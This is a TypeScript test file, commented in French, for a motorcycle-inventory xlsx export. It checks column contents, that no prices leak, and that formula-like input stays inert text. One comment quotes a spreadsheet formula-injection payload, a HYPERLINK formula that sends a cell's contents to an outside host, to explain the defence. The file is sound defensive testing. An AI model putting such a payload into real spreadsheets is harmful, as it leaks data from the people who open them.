import { describe, expect, it } from "vitest";
import { EN_TETE_EXPORT, lignesMotosExport, motosEnClasseur, nomFichierExport } from "./export";
import type { Moto } from "./moto";

const nomMarque = (id: string) => ({ ya: "Yamaha" })[id] ?? (id ? "—" : "");
const nomModele = (id: string) => ({ cry: "Crypton" })[id] ?? (id ? "—" : "");
const nomBoutique = (id: string) => ({ PTG: "Pouytenga" })[id] ?? id;

const moto = (p: Partial<Moto> = {}): Moto => ({
  id: "m1",
  boutiqueId: "PTG",
  quittanceChemin: null,
  cmcChemin: null,
  etat: "neuve",
  marqueId: "ya",
  modeleId: "cry",
  couleur: "Rouge",
  annee: 2026,
  numeroChassis: "LC6PCJ1A9K0000123",
  numeroMoteur: "MOT-9",
  prixVenteConseille: 1_100_000,
  provenanceId: "p1",
  arrivageId: null,
  papiersFournis: [],
  photos: [],
  statut: "en_stock",
  dateEntree: new Date(2026, 8, 1),
  cmcRecu: false,
  quittanceRecue: false,
  plaque: null,
  ...p,
});

/** La valeur d'une colonne nommée, sur la ligne d'une moto. */
const cellule = (ligne: readonly (string | number | null)[], colonne: string) =>
  ligne[EN_TETE_EXPORT.indexOf(colonne as (typeof EN_TETE_EXPORT)[number])];

describe("lignesMotosExport", () => {
  it("ouvre sur une ligne d’en-tête", () => {
    expect(lignesMotosExport([], nomMarque, nomModele, nomBoutique)).toEqual([[...EN_TETE_EXPORT]]);
  });

  it("écrit une moto, cadre et désignation compris", () => {
    const [, ligne] = lignesMotosExport([moto()], nomMarque, nomModele, nomBoutique);
    expect(cellule(ligne, "Châssis")).toBe("LC6PCJ1A9K0000123");
    expect(cellule(ligne, "Marque")).toBe("Yamaha");
    expect(cellule(ligne, "Modèle")).toBe("Crypton");
    expect(cellule(ligne, "Couleur")).toBe("Rouge");
  });

  /* Le code de trois lettres embrouillait le commanditaire (31 octobre
     2026) : la boutique se lit sous son nom, dans l'export comme à l'écran. */
  it("écrit le nom de la boutique, et non son code", () => {
    const [, ligne] = lignesMotosExport([moto()], nomMarque, nomModele, nomBoutique);
    expect(cellule(ligne, "Boutique")).toBe("Pouytenga");
  });

  /**
   * **Le mur de D2, et c'est tout l'enjeu de cet export.**
   *
   * « Ça doit tout prendre en compte : cadre, marque, modèle, **sauf les
   * prix**. » Ce n'est pas une préférence d'affichage. Les coûts vivent dans
   * `motos/{id}/prive/cout`, hors de portée d'un gérant — mais le prix de vente
   * conseillé, lui, est sur le document que tout le monde lit. Un export qui
   * l'emporterait ferait sortir du chiffre par la porte de derrière.
   *
   * Ce témoin ne vérifie pas une colonne : il vérifie qu'**aucun** montant
   * n'apparaît nulle part, et il le vérifie jusque dans les octets du fichier.
   * Formulé ainsi, il tient encore le jour où quelqu'un ajoute une colonne sans
   * y penser.
   */
  it("n’emporte aucun prix, nulle part", () => {
    const motos = [
      moto({ prixVenteConseille: 1_100_000 }),
      moto({ id: "m2", prixVenteConseille: 975_000 }),
    ];
    const plat = JSON.stringify(lignesMotosExport(motos, nomMarque, nomModele, nomBoutique));
    const fichier = new TextDecoder().decode(motosEnClasseur(motos, nomMarque, nomModele, nomBoutique));

    for (const dedans of [plat, fichier]) {
      expect(dedans).not.toContain("1100000");
      expect(dedans).not.toContain("1 100 000");
      expect(dedans).not.toContain("975000");
      expect(dedans.toLowerCase()).not.toContain("prix");
      expect(dedans.toLowerCase()).not.toContain("fcfa");
    }
  });

  /**
   * **Une valeur saisie ne devient plus une formule, et ce n'est plus grâce à
   * une apostrophe.**
   *
   * En CSV, une couleur saisie `=HYPERLINK("http://ailleurs/"&A1;"ok")` devenait
   * une formule *chez celui qui ouvre le fichier*, pas chez celui qui l'a tapée.
   * Il fallait la neutraliser d'une apostrophe, visible dans la cellule.
   *
   * Le classeur ferme la porte autrement : une cellule déclarée `inlineStr` ne
   * peut pas porter de formule, celles-ci vivant dans un élément `<f>`. La
   * valeur ressort donc **intacte** — et c'est le progrès, pas un oubli. Le
   * mécanisme est éprouvé dans `xlsx.test.ts` ; ici on vérifie seulement que
   * l'export ne bricole plus la donnée au passage.
   */
  it("n’abîme plus une valeur qui ressemble à une formule", () => {
    for (const texte of ["=1+1", "+1", "-1", "@SUM(A1)"]) {
      const [, ligne] = lignesMotosExport([moto({ couleur: texte })], nomMarque, nomModele, nomBoutique);
      expect(cellule(ligne, "Couleur"), texte).toBe(texte);
    }
    const fichier = new TextDecoder().decode(
      motosEnClasseur([moto({ couleur: "=1+1" })], nomMarque, nomModele, nomBoutique),
    );
    expect(fichier).not.toContain("<f>");
  });

  it("écrit l’année en nombre, pour qu’elle se trie comme un nombre", () => {
    const [, ligne] = lignesMotosExport([moto({ annee: 2024 })], nomMarque, nomModele, nomBoutique);
    expect(cellule(ligne, "Année")).toBe(2024);
    const [, sans] = lignesMotosExport([moto({ annee: null })], nomMarque, nomModele, nomBoutique);
    expect(cellule(sans, "Année")).toBeNull();
  });

  it("laisse la cellule vide quand le modèle n’a pas été saisi", () => {
    const [, ligne] = lignesMotosExport([moto({ modeleId: "" })], nomMarque, nomModele, nomBoutique);
    expect(cellule(ligne, "Modèle")).toBe("");
    expect(cellule(ligne, "Marque")).toBe("Yamaha");
  });

  it("écrit une date lisible, et rien quand elle manque", () => {
    const [, avec] = lignesMotosExport([moto()], nomMarque, nomModele, nomBoutique);
    expect(cellule(avec, "Entrée")).toBe("01/09/2026");
    const [, sans] = lignesMotosExport([moto({ dateEntree: null })], nomMarque, nomModele, nomBoutique);
    expect(cellule(sans, "Entrée")).toBe("");
  });

  it("garde l’ordre des motos qu’on lui donne", () => {
    const [, premiere, seconde] = lignesMotosExport(
      [moto({ numeroChassis: "AAA" }), moto({ id: "m2", numeroChassis: "BBB" })],
      nomMarque,
      nomModele,
      nomBoutique,
    );
    expect(cellule(premiere, "Châssis")).toBe("AAA");
    expect(cellule(seconde, "Châssis")).toBe("BBB");
  });
});

describe("motosEnClasseur", () => {
  it("rend une archive qu’un tableur saura ouvrir", () => {
    const octets = motosEnClasseur([moto()], nomMarque, nomModele, nomBoutique);
    expect([...octets.slice(0, 2)]).toEqual([0x50, 0x4b]);
    expect(new TextDecoder().decode(octets)).toContain("xl/worksheets/sheet1.xml");
  });

  it("nomme la feuille d’après ce qu’elle contient", () => {
    const contenu = new TextDecoder().decode(motosEnClasseur([], nomMarque, nomModele, nomBoutique));
    expect(contenu).toContain('name="Motos"');
  });
});

describe("nomFichierExport", () => {
  it("date le fichier, pour que deux exports ne se confondent pas", () => {
    expect(nomFichierExport(new Date(2026, 9, 8))).toBe("motos-2026-10-08.xlsx");
  });
});
